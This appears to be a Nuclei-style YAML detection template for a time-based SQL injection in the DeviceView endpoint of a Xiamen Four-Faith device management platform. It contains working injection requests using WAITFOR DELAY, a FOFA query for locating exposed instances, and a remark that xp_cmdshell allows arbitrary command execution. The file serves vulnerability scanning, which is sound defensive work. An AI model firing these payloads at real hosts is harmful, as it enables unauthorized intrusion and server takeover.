http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        - |
          GET /Device/Device/DeviceView?deviceId=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
id: sixintongxin-DeviceView-sql-time
info:
    author: Superhero
    description: |-
        fofa: body="/Content/images/textpwd.png"
        厦门四信通信科技有限公司设备管理平台 DeviceView 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
    name: 厦门四信通信科技有限公司设备管理平台 DeviceView SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/tLes2-GuGQinPsnN9tpHzw
    severity: high
    tags:
        - NPS
